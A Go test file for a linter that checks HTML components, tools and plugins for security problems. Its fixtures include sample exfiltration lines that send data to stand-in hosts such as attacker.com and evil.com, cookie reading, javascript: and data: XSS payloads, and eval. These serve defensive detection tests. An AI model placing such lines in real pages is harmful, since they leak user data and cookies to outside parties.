package lint

import (
	"strings"
	"testing"
)

func TestLintCleanComponent(t *testing.T) {
	cleanHTML := `<div class="timer">
	<h3>Pomodoro</h3>
	<span id="display">25:00</span>
	<button id="btn-start" onclick="startTimer()">Start</button>
</div>
<script>
	let remaining = 1500;
	function startTimer() {
		fetch('/api/mind')
			.then(r => r.json())
			.then(d => console.log(d));
	}
</script>`

	rep := LintComponent("pomodoro", cleanHTML)
	if !rep.Valid {
		t.Fatalf("expected clean component to be valid, got errors: %+v", rep.Findings)
	}
	if rep.ErrorsCount != 0 || rep.WarnCount != 0 {
		t.Fatalf("expected 0 errors and 0 warnings, got %d errors, %d warnings", rep.ErrorsCount, rep.WarnCount)
	}
	if !strings.Contains(rep.Summary(), "clean") {
		t.Fatalf("expected summary to contain 'clean', got: %s", rep.Summary())
	}
}

func TestLintExternalScript(t *testing.T) {
	htmlWithCDN := `<div id="app"></div>
<script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>`

	rep := LintComponent("vue-widget", htmlWithCDN)
	if rep.Valid {
		t.Fatal("expected external CDN script to fail validation")
	}
	if rep.ErrorsCount != 1 {
		t.Fatalf("expected 1 error, got %d", rep.ErrorsCount)
	}
	if rep.Findings[0].Rule != RuleExternalScript {
		t.Fatalf("expected rule %s, got %s", RuleExternalScript, rep.Findings[0].Rule)
	}
	if rep.Findings[0].Line != 2 {
		t.Fatalf("expected line 2, got %d", rep.Findings[0].Line)
	}

	// Local script should be allowed
	localHTML := `<script src="/app.js"></script><script src="./widget.js"></script>`
	repLocal := LintComponent("local-widget", localHTML)
	if !repLocal.Valid || repLocal.ErrorsCount != 0 {
		t.Fatalf("local scripts should be allowed, got: %+v", repLocal.Findings)
	}
}

func TestLintRemoteExfiltration(t *testing.T) {
	tests := []struct {
		name      string
		content   string
		shouldErr bool
	}{
		{
			name:      "remote fetch",
			content:   `<script>fetch("https://attacker.com/collect?q=" + encodeURIComponent(data));</script>`,
			shouldErr: true,
		},
		{
			name:      "protocol-relative fetch",
			content:   `<script>fetch("//malicious.com/beacon");</script>`,
			shouldErr: true,
		},
		{
			name:      "remote xhr",
			content:   `<script>var x = new XMLHttpRequest(); x.open('POST', 'https://remote.org/api');</script>`,
			shouldErr: true,
		},
		{
			name:      "remote websocket",
			content:   `<script>const ws = new WebSocket("wss://evil.com/tunnel");</script>`,
			shouldErr: true,
		},
		{
			name:      "remote sendBeacon",
			content:   `<script>navigator.sendBeacon("https://telemetry.external.com/log", blob);</script>`,
			shouldErr: true,
		},
		{
			name:      "allowed relative api",
			content:   `<script>fetch("/api/creations");</script>`,
			shouldErr: false,
		},
		{
			name:      "allowed localhost fetch",
			content:   `<script>fetch("http://localhost:7373/api/creations");</script>`,
			shouldErr: false,
		},
		{
			name:      "allowed 127.0.0.1 websocket",
			content:   `<script>new WebSocket("ws://127.0.0.1:7373/ws");</script>`,
			shouldErr: false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			rep := LintComponent(tc.name, tc.content)
			if tc.shouldErr {
				if rep.Valid || rep.ErrorsCount == 0 {
					t.Fatalf("%s: expected security error, got none: %+v", tc.name, rep)
				}
			} else {
				if !rep.Valid || rep.ErrorsCount != 0 {
					t.Fatalf("%s: expected clean validation, got: %+v", tc.name, rep.Findings)
				}
			}
		})
	}
}

func TestLintCookieAccess(t *testing.T) {
	html := `<script>
		const cookies = document.cookie;
		console.log(cookies);
	</script>`

	rep := LintComponent("cookie-stealer", html)
	if rep.Valid {
		t.Fatal("expected document.cookie access to be rejected")
	}
	if rep.ErrorsCount != 1 || rep.Findings[0].Rule != RuleCookieAccess {
		t.Fatalf("expected RuleCookieAccess finding, got: %+v", rep.Findings)
	}
}

func TestLintDangerousScheme(t *testing.T) {
	html := `<a href="javascript:alert(document.domain)">Click me</a>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>`

	rep := LintComponent("xss-payload", html)
	if rep.Valid {
		t.Fatal("expected dangerous schemes to fail validation")
	}
	if rep.ErrorsCount < 2 {
		t.Fatalf("expected at least 2 errors, got %d: %+v", rep.ErrorsCount, rep.Findings)
	}
}

func TestLintDynamicEvalWarning(t *testing.T) {
	html := `<script>
		const fn = new Function('a', 'b', 'return a + b');
		const res = eval('2 + 2');
	</script>`

	rep := LintComponent("eval-component", html)
	if !rep.Valid {
		t.Fatalf("warnings alone should not invalidate report, got invalid: %+v", rep)
	}
	if rep.WarnCount != 2 {
		t.Fatalf("expected 2 warnings for eval and new Function, got %d", rep.WarnCount)
	}
}

func TestLintToolAndPlugin(t *testing.T) {
	cleanTool := `function run(args) { return args.a + args.b; }`
	tRep := LintTool("math_add", cleanTool)
	if !tRep.Valid || tRep.WarnCount != 0 {
		t.Fatalf("expected clean tool, got: %+v", tRep)
	}

	evalTool := `function run(args) { return eval(args.expr); }`
	tEvalRep := LintTool("eval_tool", evalTool)
	if tEvalRep.WarnCount == 0 {
		t.Fatal("expected warning for eval in tool")
	}

	pluginRep := Lint("plugin", "test-plugin", evalTool)
	if pluginRep.TargetType != "plugin" || pluginRep.WarnCount == 0 {
		t.Fatalf("expected plugin warning, got: %+v", pluginRep)
	}
}
